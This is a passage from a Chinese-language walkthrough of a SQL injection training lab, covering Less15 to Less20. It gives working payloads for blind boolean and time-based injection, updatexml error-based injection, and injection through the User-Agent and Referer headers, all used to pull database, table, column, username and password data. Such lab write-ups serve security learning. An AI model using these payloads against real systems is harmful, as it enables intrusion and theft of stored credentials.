password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/03/l7wvkDSR1o86zem.png" alt="less15-3.png"></p>
<ol start="2">
<li><strong>判断数据库</strong></li>
</ol>
<ul>
<li>第一个字母</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">></span>110<span class="token comment" spellcheck="true">#</span>
password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/03/FSUwuC9bl7tJf2L.png" alt="less15-4.png"></p>
<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">></span>115<span class="token comment" spellcheck="true">#</span>
password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/03/qM48LYVXJtDIvok.png" alt="less15-5.png"></p>
<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>115<span class="token comment" spellcheck="true">#</span>
password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/03/SN5kdQIqh6oBylR.png" alt="less15-6.png"></p>
<ol start="3">
<li><strong>判断表</strong></li>
</ol>
<pre class="line-numbers language-bash"><code class="language-bash">admin<span class="token string">' and ascii(substr((select table_name from information_schema.tables where table_schema='</span>security' limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>101<span class="token comment" spellcheck="true">#</span>
password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/03/kg5xvqL2zHA9JYn.png" alt="less15-7.png"></p>
<ol start="4">
<li><strong>判断字段</strong></li>
</ol>
<pre class="line-numbers language-bash"><code class="language-bash">admin<span class="token string">' and ascii(substr((select column_name from information_schema.columns where table_schema='</span>security<span class="token string">' AND TABLE_NAME='</span>users' limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>105<span class="token comment" spellcheck="true">#</span>
password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/03/lKhgnz2DVtpi9uE.png" alt="less15-8.png"></p>
<ol start="5">
<li><strong>判断数据</strong></li>
</ol>
<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select username FROM security.users limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span>68<span class="token comment" spellcheck="true">#</span>
password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/03/QgTaAjK7Ut12C6P.png" alt="less15-9.png"></p>
<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select password FROM security.users limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span>68<span class="token comment" spellcheck="true">#</span>
password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/03/K4pfFBemqyitEJv.png" alt="less15-10.png"></p>
<h2 id="Less16"><a href="#Less16" class="headerlink" title="Less16"></a>Less16</h2><p>POST 型单引号时间盲注</p>
<hr>
<ol>
<li><strong>判断数据库字符串的长度</strong></li>
</ol>
<pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token operator">></span>56, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/04/QMI51DvbLS8CFjO.png" alt="less16-1.png"></p>
<pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token operator">=</span>56, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/04/2hpJgend5mwB8Hq.png" alt="less16-2.png"></p>
<ol start="2">
<li><strong>判断数据库</strong></li>
</ol>
<pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">></span>115, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/04/MtFigc9dbUP54wR.png" alt="less16-3.png"></p>
<pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>115, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/04/aHYBrE32bzwpNlF.png" alt="less16-4.png"></p>
<ol start="3">
<li><strong>判断表</strong></li>
</ol>
<pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">((</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span><span class="token string">'security'</span> limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">></span>101, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/04/sHFIJxU3ldpgwyn.png" alt="less16-5.png"></p>
<pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">((</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span><span class="token string">'security'</span> limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>101, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/04/mQULM4ZgyEfPaYT.png" alt="less16-6.png"></p>
<ol start="4">
<li><strong>判断字段</strong></li>
</ol>
<pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">((</span>select column_name from information_schema.columns where table_schema<span class="token operator">=</span><span class="token string">'security'</span> AND TABLE_NAME<span class="token operator">=</span><span class="token string">'users'</span> limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>105, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/04/RrjxImMcKYVAouT.png" alt="less16-7.png"></p>
<ol start="5">
<li><strong>判断数据</strong></li>
</ol>
<pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select password FROM security.users limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span>68, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/04/OTpcICZadEPRgf1.png" alt="less16-8.png"></p>
<pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select username FROM security.users limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span>68, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/04/ODnWLSBQp8iT7ye.png" alt="less16-9.png"></p>
<h2 id="Less17"><a href="#Less17" class="headerlink" title="Less17"></a>Less17</h2><p>本关是一个利用 update 语句修改修改用户密码的过程，本关注入的前提是必须要知道用户名。</p>
<hr>
<h3 id="基础知识-3"><a href="#基础知识-3" class="headerlink" title="基础知识"></a>基础知识</h3><p>这一关是一个 POST 型 update 报错注入。<br>update 语句：<code>update users set password='123456' where username='Dumb';</code></p>
<p><img src="https://i.loli.net/2019/11/13/jSUfXIGes2Ht7Tv.png" alt="less17-1.png"></p>
<h3 id="函数-4"><a href="#函数-4" class="headerlink" title="函数"></a>函数</h3><p>updatexml() 是 mysql 内置的的 XML 文件解析和修改函数。函数输出结果最大长度为 32 位。</p>
<pre class="line-numbers language-bash"><code class="language-bash">UPDATEXML <span class="token punctuation">(</span>XML_document, XPath_string, new_value<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) 。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
<p><a href="https://www.w3school.com.cn/xpath/xpath_syntax.asp" target="_blank" rel="noopener">XPath 语法</a></p>
<h3 id="工作原理-4"><a href="#工作原理-4" class="headerlink" title="工作原理"></a>工作原理</h3><ol>
<li><p>UPDATEXML 先解析执行第二个参数 Xpath string，然后再校验执行后的数据。</p>
</li>
<li><p>如果第二个参数不是 XPATH 格式的，它就会把校验失败的数据暴出来，校验失败的数据只有一部分内容，并不是所有数据都校验失败。</p>
</li>
<li><p>为了让所有的数据全部报错，就需要使用 concat() 函数在需要的数据前面加上一个 XPATH 校验失败的字符串就行了。</p>
</li>
</ol>
<p><img src="https://i.loli.net/2019/11/13/3gx67LdcPvM8GBi.png" alt="less17-2.png"></p>
<p><img src="https://i.loli.net/2019/11/13/zGpRvfVnTxoYUsN.png" alt="less17-3.png"></p>
<h3 id="注入步骤-6"><a href="#注入步骤-6" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol>
<li><strong>尝试输入 username:用户名，password:随便输+单引号</strong></li>
</ol>
<p><img src="https://i.loli.net/2019/11/13/Z5yC4w7e2ulcXvG.png" alt="less17-4.png"></p>
<ol start="2">
<li><strong>获取数据库登录用户名</strong></li>
</ol>
<pre class="line-numbers language-bash"><code class="language-bash">User Name：admin
New Password：1' or updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>SELECT user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/13/Vma7lhOCW9cEByp.png" alt="less17-5.png"></p>
<ol start="3">
<li><strong>暴数据库名</strong></li>
</ol>
<pre class="line-numbers language-bash"><code class="language-bash">User Name：admin
New Password：1' or updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>SELECT database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/13/VDtIC7AQsSxuplH.png" alt="less17-6.png"></p>
<ol start="4">
<li><strong>暴表</strong></li>
</ol>
<pre class="line-numbers language-bash"><code class="language-bash">User Name：admin
New Password：1<span class="token string">' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='</span>security' limit 0,1<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/13/WMBrefOmlCLt17N.png" alt="less17-7.png"></p>
<ol start="5">
<li><strong>暴字段</strong></li>
</ol>
<pre class="line-numbers language-bash"><code class="language-bash">User Name：admin
New Password：1<span class="token string">' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='</span>security<span class="token string">' AND TABLE_NAME='</span>users' limit 0,1<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/13/pzOFyx4r6nTv5YU.png" alt="less17-8.png"></p>
<ol start="6">
<li><strong>暴数据</strong></li>
</ol>
<pre class="line-numbers language-bash"><code class="language-bash">User Name：admin
New Password：1' or updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select username FROM security.users limit 0,1<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/13/4fhYFeNLEMROWwa.png" alt="less17-9.png"></p>
<pre class="line-numbers language-bash"><code class="language-bash">User Name：admin
New Password：1' or updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select password FROM security.users limit 0,1<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/13/3IMYn4KbgBmftZy.png" alt="less17-10.png"></p>
<h2 id="Less18"><a href="#Less18" class="headerlink" title="Less18"></a>Less18</h2><p>HTTP 头 useragent 注入</p>
<hr>
<h3 id="基础知识-4"><a href="#基础知识-4" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="什么是-HTTP-请求头"><a href="#什么是-HTTP-请求头" class="headerlink" title="什么是 HTTP 请求头?"></a>什么是 HTTP 请求头?</h4><p>首先网页是用 HTTP（HyperTextTransferProtocol）超文本传输协议。比如，你（用户/客户端）用浏览器打开一个网页，但是这个网页（html页面）并不是你电脑上的，它是从服务端（网站）上获取的。而 HTTP 就是用户和网站传递网页（html 页面）的一个通信方法。</p>
<p>在客户端和服务端使用 HTTP 协议通信过程：</p>
<ol>
<li><p>客户端发送一个明文的请求信息，告诉服务端：“我要获取哪个网页；我要使用什么方法获取网页；我用的是什么浏览器或工具获取网页；我用的 HTTP 是哪个版本。等等信息”</p>
</li>
<li><p>服务端请求信息后会回复：“我用的是 HTTP 的哪个版本回复你的；你请求的内容是正确的还是错误的；根据请求对错回复相应的网页内容”</p>
</li>
</ol>
<p>上面的请求信息，就是请求头。请求头包含请求的方法、URI、协议版本、以及包含请求修饰符、客户信息和内容。</p>
<h4 id="HTTP-请求头之-user-agent"><a href="#HTTP-请求头之-user-agent" class="headerlink" title="HTTP 请求头之 user-agent"></a>HTTP 请求头之 user-agent</h4><p>User-Agent 是告诉网站服务器，访问者是通过什么工具来请求网页的。</p>
<p><img src="https://i.loli.net/2019/11/19/s6mTchZjDv5V7SG.png" alt="less18-1.png"></p>
<p><strong>简要解析：</strong></p>
<p>我用 firefox 浏览器，查看 User-Agent 的结果</p>
<pre class="line-numbers language-text"><code class="language-text">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>User-Agent 通常格式：</strong></p>
<pre class="line-numbers language-text"><code class="language-text">Mozilla/5.0 (平台) 引擎版本 浏览器版本号<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="第一部分：Mozilla-5-0"><a href="#第一部分：Mozilla-5-0" class="headerlink" title="第一部分：Mozilla/5.0"></a>第一部分：Mozilla/5.0</h4><p>由于历史上的浏览器大战，当时想获得图文并茂的网页，就必须宣称自己是 Mozilla 浏览器。此事导致如今 User-Agent 里通常都带有 Mozilla 字样，出于对历史的尊重，大家都会默认填写该部分。</p>
<h4 id="第二部分：平台这部分可由多个字符串组成，用英文半角分号分开"><a href="#第二部分：平台这部分可由多个字符串组成，用英文半角分号分开" class="headerlink" title="第二部分：平台这部分可由多个字符串组成，用英文半角分号分开"></a>第二部分：平台这部分可由多个字符串组成，用英文半角分号分开</h4><p>Windows NT 10.0：是指我使用的操作系统的版本，比如我使用的 win10 对应的就是 Windows NT 10.0，如果我使用 win7 对应的就是Windows NT 6.1。</p>
<p>Win64;x64：是指我的操作系统是64位的。</p>
<p>rv:70.0：Gecko 的发布版本号</p>
<p>注：Gecko 的发布版本号与 firefox  的版本号相同</p>
<h5 id="Windows系统下："><a href="#Windows系统下：" class="headerlink" title="Windows系统下："></a>Windows系统下：</h5><pre class="line-numbers language-text"><code class="language-text">Windows NT 5.0 // 如 Windows 2000 
Windows NT 5.1 // 如 Windows XP
Windows NT 6.0 // 如 Windows Vista 
Windows NT 6.1 // 如 Windows 7
Windows NT 6.2 // 如 Windows 8
Windows NT 6.3 // 如 Windows 8.1
Windows NT 10.0 // 如 Windows 10
Win64; x64 // Win64 on x64
WOW64 // Win32 on x64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="Linux系统下："><a href="#Linux系统下：" class="headerlink" title="Linux系统下："></a>Linux系统下：</h5><pre class="line-numbers language-text"><code class="language-text">X11; Linux i686; // Linux 桌面，i686 版本
X11; Linux x86_64; // Linux 桌面，x86_64 版本
X11; Linux i686 on x86_64 // Linux 桌面，运行在 x86_64 的 i686 版本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h5 id="macOS系统下："><a href="#macOS系统下：" class="headerlink" title="macOS系统下："></a>macOS系统下：</h5><pre class="line-numbers language-text"><code class="language-text">Macintosh; Intel Mac OS X 10_9_0 // Intel x86 或者 x86_64
Macintosh; PPC Mac OS X 10_9_0 // PowerPC
Macintosh; Intel Mac OS X 10.12; // 不用下划线，用点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="第三部分：引擎版本"><a href="#第三部分：引擎版本" class="headerlink" title="第三部分：引擎版本"></a>第三部分：引擎版本</h4><p>引擎指是排版引擎（页面渲染引擎），主要负责取得网页的内容（HTML、XML、图象等等）、整理信息（例如加入CSS等），以及计算网页的显示方式然后会输出至显示器或打印机。</p>
<p>Gecko 是套开放源代码的、以 C++ 编写的网页排版引擎。Gecko 是跨平台的，能在 Microsoft Windows、Linux 和 Mac OS X 等主要操作系统上运行。它是最流行的排版引擎之一，其流行程度仅次于Trident。</p>
<h4 id="浏览器版本"><a href="#浏览器版本" class="headerlink" title="浏览器版本"></a>浏览器版本</h4><p>本人用的是 firefox 浏览器，其中版本为 70.0 。</p>
<h3 id="注入步骤-7"><a href="#注入步骤-7" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol>
<li><strong>在 username 和 password 中输入测试字符串，发现没有任何用,当输入正确时会多出一行信息</strong></li>
</ol>
<p><img src="https://i.loli.net/2019/11/19/jD21NIfO45EmrJ8.png" alt="less18-2.png"></p>
<p><img src="https://i.loli.net/2019/11/19/hW8uyoECJ2kl7BR.png" alt="less18-3.png"></p>
<ol start="2">
<li><strong>查看源代码，发现 uname 和 passwd 已经被检查过滤了</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">$uname = check_input($_POST['uname']);
$passwd = check_input($_POST['passwd']);
$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ol start="3">
<li><strong>继续查看源代码，会发现一个数据库插入语句，同时找到了网页最后的输出信息</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">$uagent = $_SERVER['HTTP_USER_AGENT'];
$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
echo 'Your User Agent is: ' .$uagent;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ol start="4">
<li><strong>使用 modify headers 修改 user-agent 尝试从 HTTP_USER_AGENT 进行注入</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">' or updatexml(1,concat(0x7e,(database()),0x7e),1), '','')#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/19/vR2Oj6IXdZbmKQc.png" alt="less18-4.png"></p>
<p><img src="https://i.loli.net/2019/11/19/79qik3cOvUQMrsA.png" alt="less18-5.png"></p>
<p>注：modify headers 插件在 firefox 没有生效，在 chrome 生效。</p>
<ol start="5">
<li><strong>暴表</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">1' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1), '','')#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/19/frjIm8HdKZ6GERN.png" alt="less18-6.png"></p>
<ol start="6">
<li><strong>暴字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">1' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),0x7e),1), '','')#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/19/SWIt5cZbDzriKVa.png" alt="less18-7.png"></p>
<ol start="7">
<li><strong>暴数据</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">1' or updatexml(1,concat(0x7e,(select username FROM security.users limit 0,1),0x7e),1), '','')#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/19/1tKOxrTbRFZzLM2.png" alt="less18-8.png"></p>
<h2 id="Less19"><a href="#Less19" class="headerlink" title="Less19"></a>Less19</h2><p>HTTP 头 referer 注入，本关注入的前提是必须要知道用户名和密码</p>
<hr>
<h3 id="基础知识-5"><a href="#基础知识-5" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="HTTP-请求头之-referer"><a href="#HTTP-请求头之-referer" class="headerlink" title="HTTP 请求头之 referer"></a>HTTP 请求头之 referer</h4><p>HTTP 请求的头信息里面，Referer 是一个常见字段，简单来说就是告诉服务器我是从哪个 ”链接“ 来访问这个网页的。</p>
<p>有趣的是，这个字段的拼写是错的。Referer的正确拼写是Referrer，但是写入标准的时候，不知为何，没人发现少了一个字母r。标准定案以后，只能将错就错，所有头信息的该字段都一律错误拼写成Referer。</p>
<p><strong>用途：</strong></p>
<ol>
<li>获取访问来源，统计访问流量的来源和搜索的关键词，分析用户的兴趣爱好、收集日志、优化缓存等等</li>
</ol>
<p>比如说用户点开百度的一个链接，他的服务器就能够从 HTTP Referer 中统计出每天有多少用户点击了该链接来访问这个网站</p>
<ol start="2">
<li>防盗链</li>
</ol>
<p>通过分析访问源，拒绝非法访问，主要是图片和网盘服务器使用的较多。</p>
<h3 id="注入步骤-8"><a href="#注入步骤-8" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol>
<li><strong>在 username 和 password 中输入测试字符串，发现没有任何用,当输入正确时会多出一行信息</strong></li>
</ol>
<p><img src="https://i.loli.net/2019/11/20/q238Rea7khFvtUg.png" alt="less19-1.png"></p>
<p><img src="https://i.loli.net/2019/11/20/o67cW3BwYnJetT1.png" alt="less19-2.png"></p>
<ol start="2">
<li><strong>查看源代码，发现 uname 和 passwd 已经被检查过滤了</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">$uname = check_input($_POST['uname']);
$passwd = check_input($_POST['passwd']);
$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ol start="3">
<li><strong>继续查看源代码，会发现一个数据库插入语句，同时找到了网页最后的输出信息</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">$uagent = $_SERVER['HTTP_REFERER'];
$insert="INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";
echo 'Your Referer is: ' .$uagent;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ol start="4">
<li><strong>使用 modify headers 修改 referer 尝试从 HTTP_REFERER 进行注入</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">' or updatexml(1,concat(0x7e,(database()),0x7e),1), '','')#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/20/jIHqxRLOE5b4KYF.png" alt="less19-3.png"><br><img src="https://i.loli.net/2019/11/20/uMJITCxA8rl5kcD.png" alt="less19-4.png"></p>
<ol start="5">
<li><strong>暴表</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">1' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1), '','')#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/20/6wKNvcOAaxfDsJo.png" alt="less19-5.png"></p>
<ol start="6">
<li><strong>暴字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">1' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),0x7e),1), '','')#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/20/1W3YXuqdbSBLnlZ.png" alt="less19-6.png"></p>
<ol start="7">
<li><strong>暴数据</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">1' or updatexml(1,concat(0x7e,(select username FROM security.users limit 0,1),0x7e),1), '','')#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/20/bhGZ1PJE8k2Au47.png" alt="less19-7.png"></p>
<h2 id="Less20"><a href="#Less20" class="headerlink" title="Less20"></a>Less20</h2><p>HTTP 头 cookies 注入，本关注入的前提是必须要知道用户名和密码。</p>
<hr>
<h3 id="基础知识-6"><a href="#基础知识-6" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="cookie起源"><a href="#cookie起源" class="headerlink" title="cookie起源"></a>cookie起源</h4><p>早期的 Web 应用面临的最大问题之一就是如何维持状态。简言之，服务器无法知道两个请求是否来自于同一个浏览器。当时，最简单的办法就是在请求的页面中插入一个 token，然后在下次请求时将这个 token 返回至服务器。这需要在页面的 form 表单中插入一个包含 token 的隐藏域，或者将 token 放在 URL 的 query 字符串中来传递。这两种方法都需要手动操作，而且极易出错。</p>
